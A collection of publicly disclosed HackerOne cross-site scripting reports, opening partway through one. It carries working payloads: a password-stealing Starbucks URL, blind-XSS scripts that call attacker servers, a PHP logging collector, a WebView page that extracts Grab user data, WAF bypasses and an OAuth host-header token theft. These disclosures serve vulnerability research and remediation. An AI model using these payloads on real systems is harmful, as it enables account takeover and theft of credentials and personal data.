- `https://www.starbucks.com/account/(F(%22%20%252fonmouseover=%22%2561%256c%2565%2572%2574%2528%2564%256f%2563%2575%256d%2565%256e%2574%252e%2567%2565%2574%2545%256c%2565%256d%2565%256e%2574%2573%2542%2579%254e%2561%256d%2565%2528%2527%2541%2563%2563%256f%2575%256e%2574%252e%2550%2561%2573%2573%2557%256f%2572%2564%2527%2529%255b%2530%255d%252e%2576%2561%256c%2575%2565%2529%22))/signin`

{F839660}


## How can the system be exploited with this bug?
  An attacker can easily abuse this bug to steal user passwords, inject malicious javascript into the context of `www.starbucks.com`, etc.

## Suggested Mitigation
Implement HTML encoding / escaping on the path.

## Impact

This is a high impact vulnerability as this affects the login page.

Best,
@cdl

**Summary (team):**

cdl and hunt4p1zza discovered a vulnerability within how ASP.Net handles the URI to perform reflected cross site scripting (XSS).
@cdl and @hunt4p1zza — thank you for reporting this vulnerability and for confirming the resolution.

---

### [[www.zomato.com] Blind XSS on one of the Admin Dashboard](https://hackerone.com/reports/724889)

- **Report ID:** `724889`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Eternal
- **Reporter:** @pandaaaa
- **Bounty:** 750 usd
- **Disclosed:** 2019-11-19T04:59:11.188Z
- **CVE(s):** -

**Summary (team):**

Thanks for the report @pandaaaa.

**Summary (researcher):**

* The Blind XSS fired when the order details were viewed by the admin at the back-end, The script was injected through an API endpoint from the Zomato app on one of the parameters which was recently introduced to provide special instructions to the restaurant on how to prepare the food.

* I used XSS Hunter to do this and the payload used was - `"><script src=https://{$handle}.xss.ht></script>`.

* I wasn't really testing when i found this bug. My mom was late and tired from the office and she asked me to order food and then i decided to try this. :P Thanks Mom! <3

---

### [Html Injection and Possible XSS via MathML](https://hackerone.com/reports/502926)

- **Report ID:** `502926`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** X / xAI
- **Reporter:** @z41b1337_
- **Bounty:** - usd
- **Disclosed:** 2019-09-03T21:23:47.935Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,
I would like to report HTML Injection and possible cross site scripting (XSS) vulnerability using the MathML on Firefox.
Account title of field is vulnerable to Html Injection which can lead an attacker to store javascript using the MathML in Firefox.
Modern Firefox versions allow usage of inline MathML. While other user agents don't support the href attribute for MathML elements (yet), Firefox does and thereby enables passive JavaScript execution. Note that supporting href for MathML elements is a feature - introduced with MathML 3. The same effect can be observed by using xlink:href. The statusline action further enables obfuscation of the actual link target - and in this example hides the JavaScript URI.

Step to reproduce
1- Login to your mopub account.
2- Go to account settings.
3- Click on Edit user settings.
4- Add this payload in Title field 

<math href="javascript:alert(1)">CLICKME</math>

<math>
<!-- up to FF 13 -->
<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>

<!-- FF 14+ -->
<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
</math>

5- Click on Submit Button.
6- HTML link will be stored in account Title.
7- Click on that html link and XSS will be executed in Firefox.

POC
Please see the images in the attachment.

## Impact

The vulnerability allow a malicious user to inject html tags and execute Javascript  which could lead to steal user's session

---

### [URL Advisor component in KIS products family is vulnerable to Universal XSS](https://hackerone.com/reports/463915)

- **Report ID:** `463915`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Kaspersky
- **Reporter:** @palant
- **Bounty:** - usd
- **Disclosed:** 2019-08-28T17:54:25.462Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary**
In Microsoft Edge, URL Advisor UI is served as first-party content on every domain. So the XSS vulnerability I found in this UI automatically applies to all websites, it allows running code in the context of *any* domain.

**Description**
URL Advisor frame is located under https://www.google.com/<INJECT_ID>/ua/url_advisor_balloon.html and https://www.yahoocom/<INJECT_ID>/ua/url_advisor_balloon.html in Microsoft Edge (always the same INJECT_ID value). It gets its content from a message sent via `window.postMessage()` without validating message origin. Under some circumstances it will assign that data as link target, so a malicious website can make that link point to a javascript: URL. Clickjacking then allows making the user click that link - while sites like google.com use X-Frame-Options header to disallow framing, no such restrictions are in place for the url_advisor_balloon.html frame.

**Environment**
- Scope: Application
- Product name: Kaspersky Internet Security
- Product version: 19.0.0.1088
- OS name and version (incl SP): Windows 10.0.17134
- Attack type: Universal XSS
- Maximum user privileges needed to reproduce your issue: no privileges

**Steps to reproduce**
1. Download attached `server.py` and `universal_xss.html` to some directory on your computer and run `server.py` (Python 3 required). This is a very rudimentary HTTP server running on http://localhost:5000/, you could use some other web server as well.
2. Edit the file %WINDIR%\sysnative\drivers\etc\hosts as administrator and add the following line: `127.0.0.1 www.google.example.com`. Normally, you would just use a subdomain of a domain you own - the host name has to start with "www.google." for URL Advisor to apply to it.
3. Open Microsoft Edge and go to http://www.google.example.com:5000/universal_xss.html
4. As advised by the page, move your mouse and click somewhere on the page.

You will see an alert message saying: "Hi, this is JavaScript code running on www.google.com." That's the result of the code `alert('Hi, this JavaScript code is running on ' + document.domain)` executing in the context of the Google website. Injecting code into any other domain would have been easily possible as well.

**Recommendation**
This user interface should never be served as first-party, even once the vulnerability here is fixed. Any XSS vulnerability in Kaspersky code automatically elevates to Universal XSS otherwise, this is too dangerous. Frankly, I don't see why it is done in this way with Microsoft Edge - in Firefox and Internet Explorer the same UI is always served via kis.v2.scr.kaspersky-labs.com, so vulnerabilities here don't affect other websites.

## Impact

A malicious website can easily make users click by pretending to be a game. And while the user clicks, they will be allowing the attackers to inject code into various internet domains and exfiltrating data in the background.

---

### [[www.zomato.com] Blind XSS in one of the admin dashboard](https://hackerone.com/reports/461272)

- **Report ID:** `461272`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Eternal
- **Reporter:** @nguyenlv7
- **Bounty:** 500 usd
- **Disclosed:** 2019-05-01T07:05:15.495Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Admin dasboard ████ from user has XSS Vul

## Steps To Reproduce:
  1. Login ██████
  1. Go to ███ function and intercept request
Post data: "><img src="http://<my_server_ip>/zomato.php?c=zomato_xss" />

```
POST ████ HTTP/1.1
X-Zomato-App-Version-Code: 5610001
██████████
███████
X-Zomato-API-Key: ███████
X-App-Language: &lang=en&android_language=en&android_country=VN
X-Zomato-App-Version: 561
X-Network-Type: wifi
X-Present-Long: ███████
X-Zomato-UUID: ████████
X-O2-City-Id: 35
User-Agent: &source=android_market&version=7.1.2&device_manufacturer=samsung&device_brand=samsung&device_model=SM-N9005&app_type=android_ordering
X-Access-Token: █████
X-Device-Pixel-Ratio: 1.5
X-City-Id: 35
X-Device-Width: 720
Content-Type: application/x-www-form-urlencoded
Akamai-Mobile-Connectivity: type=wifi;appdata=com.application.zomato.ordering;prepositioned=true;websdk=18.4.2;carrier=Viettel Telecom/452,04;devicetype=1;rwnd=2097152;
X-Client-Id: zomato_android_v2
X-Present-Lat: ██████
██████
X-Device-Height: 1280
Content-Length: 156
Host: api.zomato.com
Connection: close

█████="><img+src%3d"http%3a//<my_server_ip>/zomato.php%3fc%3dzomato_xss"+/>█████████
```

 1.  File **zomato.php** on my server:

```
<?php
$time = date('Y-m-d H:i:s', time());
$refer = $_SERVER['HTTP_REFERER'];
$ip = $_SERVER['REMOTE_ADDR'];
$c = isset($_GET['c']) ? $_GET['c']: '0';
file_put_contents("log.txt","Time: ". $time ."IP: ". $ip." Referer: ".$refer. "C: ". $c . "\n", FILE_APPEND);
?>
```
 1. XSS triggered when Admin viewed the ███████.

 1. Result in file **log.txt** time UTC

```
Time: 2018-12-12 13:49:25IP: █████ Referer: C: zomato_xss
Time: 2018-12-12 14:01:17IP: ████████ Referer: C: zomato_xss
```

I captured 2 ip from India.
Please verify for me.

## Impact

* Steal admin cookies.

---

### [[Grab Android/iOS] Insecure deeplink leads to sensitive information disclosure](https://hackerone.com/reports/401793)

- **Report ID:** `401793`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Grab
- **Reporter:** @bagipro
- **Bounty:** - usd
- **Disclosed:** 2019-03-15T23:41:10.132Z
- **CVE(s):** -

**Summary (team):**

A deeplink feature was found missing validation that led to sensitive information disclosure. Once triggered, the deeplink would direct users to load any attacker-controlled URL within a webview. The impact was further escalated as the webview contain sensitive information. A temporary patch was distributed shortly after the submission was verified and a permanent patch was released and completely rolled out soon after. 

Grab appreciate @bagipro's contribution to our bug bounty program, @bagipro displayed strong mobile offensive security skills and detailed report which allowed us to quickly reproduce and validate the submission. As a mobile-first company, mobile security is our utmost focus, Grab look forward to seeing more of his creative bug reports to our program.

**Summary (researcher):**

I've found a set of possible deeplinks, one of them (``` HELPCENTER ```) could lead that an arbtrary URL was opened in a built-in browser in activity ``` com.grab.pax.support.ZendeskSupportActivity ``` using that code (should be used in an external browser/messenger)
```html
<!DOCTYPE html>
<html>
<head><title>Page 1</title></head>
<body style="text-align: center;">
    <h1><a href="grab://open?screenType=HELPCENTER&amp;page=https://s3.amazonaws.com/edited/page2.html">Begin attack!</a></h1>
</body>
</html>
```
But the WebView had an interesting setting
```java
        mWebView.addJavascriptInterface(new com.grab.pax.support.ZendeskSupportActivity.WebAppInterface(this), "Android");
```
with method
```java
        @android.webkit.JavascriptInterface
        public final java.lang.String getGrabUser() {
            //...
            return com.grab.base.p167l.GsonUtils.m7210a(zendeskSupportActivity.getMPresenter().getGrabUser());
        }
```

I tested my code which forced Grab Passenger app to load ``` https://s3.amazonaws.com/edited/page2.html ``` page with HTML
```html
<!DOCTYPE html>
<html>
<head><title>Page 2</title></head>
<body style="text-align: center;">
    <script type="text/javascript">
        var data;
        if(window.Android) { // Android
            data = window.Android.getGrabUser();
        }
        else if(window.grabUser) { // iOS
            data = JSON.stringify(window.grabUser);
        }

        if(data) {
            document.write("Stolen data: " + data);
        }
    </script>
</body>
</html>
```

I didn't reverse iOS app, but only opened https://help.grab.com/, grepped for ``` getGrabUser ``` and found
```js
    public static initGrabUser() {
        if (Utils.Condition.isIOSApp()) {
            Stores.GrabUser.setGrabUser(window.grabUser);
        }

        if (Utils.Condition.isAndroidApp()) {
            Stores.GrabUser.setGrabUser(JSON.parse(Android.getGrabUser()));
        }
    }
```
It helped me to realize how to exploit iOS too :)

Tips: JS interfaces (on both platforms) have no origin policies, so if you have the ability to make an Open Redirect or XSS (i.e. run your own JS in the given WebView), it means you can access them!

---

### [[Android] HTML Injection in BatterySaveArticleRenderer WebView](https://hackerone.com/reports/176065)

- **Report ID:** `176065`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Brave Software
- **Reporter:** @bobrov
- **Bounty:** 150 usd
- **Disclosed:** 2018-10-22T19:51:14.435Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

HTML Injection in BatterySaveArticleRenderer WebView.

## Products affected: 

 * Android Brave Browser 1.9.56

## Steps To Reproduce:

 * Open https://blackfan.ru/brave or html

```html
<script>
location="https://www.google.com/search?q=</title><h1><marquee><s>Injection<!--"
</script>
```
* Wait for a full load
* Click on ArticleModeButton

## Supporting Material/References:

Vulnerable code:
```java
public class aot
...
// s7 == title
if(s7 != null)
{
  s4 = (new StringBuilder()).append(s5).append("<title>").append(s7).append("</title>").toString();
  s1 = (new StringBuilder()).append(s6).append("<p style=\"font-size:").append(s1).append(";line-height:120%;font-weight:bold;margin:").append(s3).append(" 0px 12px 0px\">").append(s7).append("</p>").toString();
...
// s8 == authorName
if(s8 != null)
  s1 = (new StringBuilder()).append("<span class=\"nowrap\"><b>").append(s8).append("</b>,</span> ").toString();
```

---

### [Account Takeover in Periscope TV](https://hackerone.com/reports/317476)

- **Report ID:** `317476`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** X / xAI
- **Reporter:** @ngalog
- **Bounty:** - usd
- **Disclosed:** 2018-09-06T15:37:02.275Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 

When you login periscope.tv using twitter, and change the host header from `www.periscope.tv` to `attacker.com/www.periscope.tv`, the oauth redirect destination will be `attacker.com/www.periscope.tv`, thus allowing attacker to send the oauth authorize link to victim, and takeover their account after auto redirect.

## Steps To Reproduce:
Visit https://www.periscope.tv/ and click login with twitter, a request should appear

```
GET /i/twitter/login?csrf=████ HTTP/1.1
Host: www.periscope.tv
User-Agent: █████████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.periscope.tv/
cookie: ...
```

Change the host header to 

`Host: hackerone.com/www.periscope.tv`

Full request

```
GET /i/twitter/login?csrf=██████ HTTP/1.1
Host: hackerone.com/www.periscope.tv
User-Agent: █████████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.periscope.tv/
cookie: ...
```

Response should be something like 

```
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;https://twitter.com/oauth/authenticate?oauth_token=████████"></head></html>
```

Send this link to victim, after authorizing, victim's twitter oauth token and verifier is sent to hackerone.com, attacker could now reuse the same token to takeover victim's account.

Vimeo: https://vimeo.com/256356501
password: ███████

## Impact

Account Takeover for periscope.tv

**Summary (researcher):**

Another way to exploit host header poisoning

---

### [[html-pages] Stored XSS in the filename when directories listing](https://hackerone.com/reports/330356)

- **Report ID:** `330356`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @tungpun
- **Bounty:** - usd
- **Disclosed:** 2018-06-12T08:04:51.222Z
- **CVE(s):** CVE-2018-16481

**Vulnerability Information:**

I would like to report a Store XSS vulnerability in **html-pages**
It allows executing malicious javascript code in the user's browser.

# Module

**module name:** html-pages
**version:** 2.1.1
**npm page:** `https://www.npmjs.com/package/html-pages`

## Module Description

Simple development http server for file serving and directory listing made by a Designer. Use it for hacking your HTML/JavaScript/CSS files, but not for deploying your final site. 

# Vulnerability

## Steps To Reproduce:

* Install the module:
`$ npm install html-pages`

* On the working directory, create a new child directory with name: `"><svg onload=alert(5);>`

* Start the server:
`$ ./node_modules/html-pages/bin/index.js -p 6060`

* Go to `http://127.0.0.1:6060/`, then click on the directory `"><svg onload=alert(5);>`
or open `http://127.0.0.1:6060/%22%3E%3Csvg%20onload=alert(5);%3E/` directly, the XSS popup will fire:

{F279119}

## Vulnerability Description

This issue happens because of the lack of path sanitization.

HTML output:
```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Files within nodejs-example/"><svg onload=alert(5);></title>
    <meta name="description" content="">
    <link rel="stylesheet" href="/@html-pages-internal-files-hoihj6ey0qu/css/style.css">
    <link rel="stylesheet" href="/@html-pages-internal-files-hoihj6ey0qu/css/component.css">
    <link rel="stylesheet" href="/@html-pages-internal-files-hoihj6ey0qu/css/loader.css">
    <link rel="icon" type="image/svg+xml" href="/@html-pages-internal-files-hoihj6ey0qu/images/logo.svg">
  </head>

  <body>
    <header>
      <div class="wrapper">
        <nav>
          <ol class="breadcrumb custom-separator">
              <li class="">
                <a class="background-effect" href="/">nodejs-example</a>
              </li>
              <li class="current">
                <span>"><svg onload=alert(5);></span>
              </li>
          </ol>
        </nav>

[...]

```

## Supporting Material/References:

* macOS High Sierra 10.13.3
* node v8.10.0
* npm 5.6.0
* Firefox 59.0.2 (64-bit)

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows executing malicious javascript code in the user's browser

---

### [XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)](https://hackerone.com/reports/227486)

- **Report ID:** `227486`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Starbucks
- **Reporter:** @bayotop
- **Bounty:** - usd
- **Disclosed:** 2018-05-22T21:50:20.339Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

**Steps to reproduce:**

0. Run Firefox (these steps *require* Firefox).
1. Log in on https://www.starbucks.co.uk/account/signin
2. Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.
3. Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton
4. After the page finishes loading click the "Checkout" title.
5. A confirmation prompt is shown showing the current domain.

**Note** that these steps can be automated due to missing CSRF protection on the "Add to Basket" option. Effectively, all a user has to do is to load a page which is under attacker's control. I set up an example: http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html (this link is private).

**Description:**

I'll explain what is going on and why this works. First, take a look at https://www.starbucks.co.uk/shop/card/egift?reflected 
Looking at the source code you see the whole URL is reflected in a link tag. 

```html
<link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift?reflected" />
```
Trying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected results in: 

```html
<link rel="canonical" href="https://www.starbucks.co.uk/shop/card/egift?" id="injected" />
```

This works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy [script](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) loaded into the page that does the following:

```javascript
$("#checkout").bind("click", function(e) {
    $("#checkoutButton").trigger("click")
});
```

You see where this is going. In case I find a page that has an element with the id **checkout**, I can inject **id="checkoutButton" onclick="malicous_js"** to the above link element and the injected JS will be executed once the **checkout** element is clicked. 

Exactly such a page is https://www.starbucks.co.uk/shop/paymentmethod (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can't be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe's content to steal the victim's credit card information:

```javascript
document.getElementById('payment-method-iframe').contentWindow.location.href = 'https://sbuxphishingsiteunderattackerscontrol.com';
```

**Note** that the **checkout** element is actually **<body>** so there is plenty of space where the user can click to execute the malicious JS.

Take into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers' built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.

To sum up, I'll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):

1. **==** -> used to trick the [query string parsing code](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) that is calling decodeURIcomponent(). Otherwise decodeURIcomponent("%u0022") throws an exception resulting in the "checkout bind" never being called.
2. **%u0022** -> bypasses the WAF that is causing a 404 when the query contains "%22".
3. **a%20onclick=** -> allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.
4. **confirm(/-/g** -> the WAF seems to dislike confirm(), alert() and so on. Adding a '/' after the left bracket makes him happy again.
5. **+this.ownerDocument.domain)** -> the WAF doesn't like "document".

**Impact**

As mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on "https://starbucks.co.uk" as usual. Note that other "typical" possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.

**Recommendation**

Correctly encode user input before rendering it back into the page. You shouldn't rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like "Add to Basket". You might also consider fixing the bypasses I mentioned.

---

### [The react-marked-markdown module allows XSS injection in href values.](https://hackerone.com/reports/344069)

- **Report ID:** `344069`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @ronperris
- **Bounty:** - usd
- **Disclosed:** 2018-05-13T17:11:10.683Z
- **CVE(s):** -

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report XSS in react-marked-markdown.
The react-marked-markdown module incorrectly sanitizes href values and allows arbitrary code injection (XSS) via user provided Markdown.

# Module

**module name:** react-marked-markdown
**version:** 1.4.6
**npm page:** `https://www.npmjs.com/package/1.4.6`

## Module Description

A react components package that helps you use Markdown easily.

## Module Stats

> Replace stats below with numbers from npm’s module page:

133 downloads in the last day
935 downloads in the last week
4207 downloads in the last month

# Vulnerability

## Vulnerability Description

The React component created with react-marked-markdown contains XSS in link values even when the sanitize option is set to true.

The react-marked-markdown module uses marked.Render() but overwrites the link method with a custom version that doesn't correctly escape values passed to the href prop of anchor components.

## Steps To Reproduce:

import React from 'react'
import ReactDOM from 'react-dom'
import { MarkdownPreview } from 'react-marked-markdown'

ReactDOM.render(
  <MarkdownPreview
    markedOptions={{ sanitize: true }}
    value={'[XSS](javascript: alert`1`)'}
  />,
  document.getElementById('root')
)

## Patch

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- macOS 10.13
- Node.js 8.11.1
- npm 6.0

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: Y 
- I opened an issue in the related repository: Y 

https://github.com/Vincent-P/react-marked-markdown/issues/61

## Impact

The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. This allows attackes to add malicious scripts to the page via Markdown.

---

### [[cloudcmd] Stored XSS in the filename when directories listing](https://hackerone.com/reports/341044)

- **Report ID:** `341044`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Node.js third-party modules
- **Reporter:** @tungpun
- **Bounty:** - usd
- **Disclosed:** 2018-04-25T17:46:22.250Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a Stored XSS issue in module **cloudcmd**
It allows executing malicious javascript code in the user's browser.

# Module

**module name**: cloudcmd
**version**: 9.1.5
**npm page**: https://www.npmjs.com/package/cloudcmd

## Module Description

> Cloud Commander is an orthodox web file manager with console and editor.

## Module Stats

4,433 downloads in the last week

{F288918}

# Vulnerability

## Steps To Reproduce:

* Install the module

```
$ npm i cloudcmd
```

* Run

```
$ ./node_modules/cloudcmd/bin/cloudcmd.js --root .
```

* In the target directory, create a file with name `"><svg onload=alert(3);>`

```
bash$ touch '"><svg onload=alert(3);>'
```

* In the browser, go to http://127.0.0.1:8080/, the XSS popup will fire.

{F288917}

## Supporting Material/References:

* macOS High Sierra 10.13.4
* node v8.10.0
* npm 5.6.0
* Chrome Version 65.0.3325.181 (Official Build) (64-bit)

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows executing malicious javascript code in the user's browser

---

### [Html injection mycrypto.com](https://hackerone.com/reports/324548)

- **Report ID:** `324548`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** MyCrypto
- **Reporter:** @w2w
- **Bounty:** - usd
- **Disclosed:** 2018-03-16T17:51:25.344Z
- **CVE(s):** -

**Vulnerability Information:**

Hello. I remembered that a couple of months ago I found an HTML injection vulnerability on myetherwallet.com, I sent it, but my message was ignored.
Since you have the same interface, I decided to check this vulnerability on your site and it was reproduced. The vulnerability works both on www.mycrypto.com and on mycrypto.com.
Html injection is in a pop-up message

 <div class = "alert-message ng-binding" ng-bind-html = "alert.message"> You are successfully connected
<br> URL: <strong> https://www.mycrypto.com/?txHash=qwqwq%3C%20SRC=%22jav
ascript: alert (0); "& gt; <a href="https://securityz.net"> <img src =" https://securityz.net/mycrypto.jpeg "> </a> qwqw # check- tx-status </ strong> <br> Network: <strong> ETH </ strong> provided by <strong> mycryptoapi.com </ strong> </ div>

Unfortunately, you have filtering there, I could not execute js and could hardly display a picture with href on the page. 
## PoC
 https://mycrypto.com/?txHash=qwqwq%3C%20SRC=%22jav&#x0D;ascript:alert(0);"> <a href="https://securityz.net"><img src="https://securityz.net/mycrypto.jpeg"></a>qwqw#check-tx-status 

##PoC video
 https://www.youtube.com/watch?v=JmP9AU8sX5k .
##Impact
Since your site and myetherwallet are often subjected to phishing attacks, this vulnerability is dangerous. You can put in the href url of the phishing site, then you can steal the private key of the victim. Perhaps you can upload js to the site, but I could not do it.

## Impact

Since your site and myetherwallet are often subjected to phishing attacks, this vulnerability is dangerous. You can put in the href url of the phishing site, then you can steal the private key of the victim. Perhaps you can upload js to the site, but I could not do it.

---

### [[informatica.com]- Cross Site scripting ](https://hackerone.com/reports/204237)

- **Report ID:** `204237`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @rotembar
- **Bounty:** - usd
- **Disclosed:** 2017-10-30T06:03:06.259Z
- **CVE(s):** -

**Summary (team):**

The researcher was able to find a reflected XSS in informatica.com.

---

### [Stored XSS / Bypassing .htaccess protection in http://nodebb.ubnt.com/](https://hackerone.com/reports/202354)

- **Report ID:** `202354`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @inhibitor181
- **Bounty:** - usd
- **Disclosed:** 2017-09-28T07:23:26.659Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

While I was looking at your renewn SSL certificated, I have noticed the following link : http://nodebb.ubnt.com/

I have seen that this link was protected by htaccess password, but I have decided to run a nmap scan. By running the following :

```
sudo nmap -sSV -p- 104.131.159.88 -oA stage_ph -T4
```

one of the open ports was this : `4567/tcp open   tram?`

And, to my surprise the ip `104.131.159.88:4567`, as well as `http://nodebb.ubnt.com:4567/` were available from internet and unprotected.

Here, I have found a nodeBB instance and I have managed to create a persisted XSS by using the  upload API, that does not properly sanitize the file names and automatically sets wrong mime types. 

Normally, it seems that the user is allowed to upload only images, but the stored XSS was possible by injecting malicious html in the exif data and changing the file name to .html.

I have attached a video with the POC, as well as the exif image.

I have not managed to RCE, but it is also worth noting that uploading the file with the .php extension and writing php content using exif IS possible.

---

### [Store XSS on Informatica University via transcript (informatica.csod.com)](https://hackerone.com/reports/219509)

- **Report ID:** `219509`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @alfredsaonoy
- **Bounty:** - usd
- **Disclosed:** 2017-09-09T18:15:06.379Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

Vulnerable field: Training Description

Steps to reproduce:
1. Login to your account and go Informatica University.
2. You can either click on "My Training" or "Universal Profile" at the upper right hand corner of the page.
3. You will then be redirected to the Universal profile bio page, click on the "Transcript tab"
4. Select options on the upper right side then select "Add external training: on the drop down option.
5. Fill out the needed information but for the Training Description use the following payload:
'"><img src=x onerror=alert(document.cookie);>
6. Complete the rest of the form and click on Submit.
7. You will then be redirected to your training transcript.
8. On the right side of the transcript which has a label withdraw, select from the drop down "View training details"
9. The page will be redirected and you will then get the xss pop-up.

Would be best to sanitize all input on this form to avoid xss. 

Works on latest versions of chrome, and firefox.


Please let me know if you need further information. Thanks!

Cheers,

@ninjakatz__

---

### [Stored XSS on Admin Access Page - Email field](https://hackerone.com/reports/173501)

- **Report ID:** `173501`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Revive Adserver
- **Reporter:** @pavanw3b
- **Bounty:** - usd
- **Disclosed:** 2017-08-02T05:58:41.882Z
- **CVE(s):** -

**Vulnerability Information:**

"Cricetinae" :)

###Short Description

The **Email** field is not sanitized on **Inventory > Admin Access** page resulting in to Stored Cross-Site Scripting vulnerability.

###Vulnerability Details

Cross-Site Scripting issue let's one to run a javascript of choice. It helps most of the client side risks including but not limited to phishing, temporary deface, browser key-logger and others. Exploitation frameworks like BeEF eases the offensive attack.

Stored XSS is more risky than the reflected ones because of the fact that the malicious script is persisted across. It can affect all the time and all the users who has the access to the page.

### Attack Vector
As this is a stored XSS, the attack vector lies in one user phishing other users. If there are multiple administrators, one admin can get a javascript backdoor on another admin's browser.

### Steps to Reproduce
To effectively illustrate one user affect another user, please create 2 admin accounts and follow the below instruction:
* Login as `admin1`. Navigate to **Preferences** *>* **Change E-mail**
* Enter the current password and `admin1@example.com<script>alert('xss');</script>` for *Email address* field. Save and logout
* Login as `admin2`. 
* Navigate to **Inventory** *>* **Admin Access** and notice the alert box.

Attached screenshot for a reference.

### Test Environment Details
Version: Latest as on Oct 2: revive-adserver-4.0.0 downloaded from the official source
Setup type: local
Browser: Firefox 47.0
OS: Mac OS X


Cheers,
Pavan

---

### [Wordpress 4.7.2 - Two XSS in Media Upload when file too large.](https://hackerone.com/reports/203515)

- **Report ID:** `203515`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** WordPress
- **Reporter:** @skansing
- **Bounty:** - usd
- **Disclosed:** 2017-07-17T23:52:34.026Z
- **CVE(s):** -

**Vulnerability Information:**

Description
-------------------
An attacker can inject a malicious script in to the filename which a victim tries to upload leading to XSS inside the administrators control panel.

Two different "file to large" cases end up in interpolating the file name and appending it into DOM unsanitized leading to XSS.

I have attached pictures of one of the cases, in the attached case the file was 12.4 MB, in a freshly installed environment. For reproduction note that any file type can be used (.jar whatever) as the vuln happens before the type is validated.

PoC
-------------------
Create a 20MB file called 

`Dinosaurs secret life<img src=x  onerror=alert(1)>.png`

Goto your wordpress site `http://127.0.0.1/wp-admin/media-new.php` and drag`n`drop or use file manager or choose the file via. the "Select Files" button.

A error will appear with `... exceeds the maximum upload size for this site.` along with a alert box to display that the payload has been executed.

Details on XSS
-------------------
The file `script-loader.php` prepares an array of messages for use later.

```
	// error message for both plupload and swfupload
	$uploader_l10n = array(
                ...
		'file_exceeds_size_limit' => __('%s  exceeds the maximum upload size for this site.'),
		'big_upload_failed' => __('Please try uploading this file with the %1$sbrowser uploader%2$s.'),
		...
	);
```

The payload will be injected into the `%s` in the key `file_exceeds_size_limit`.

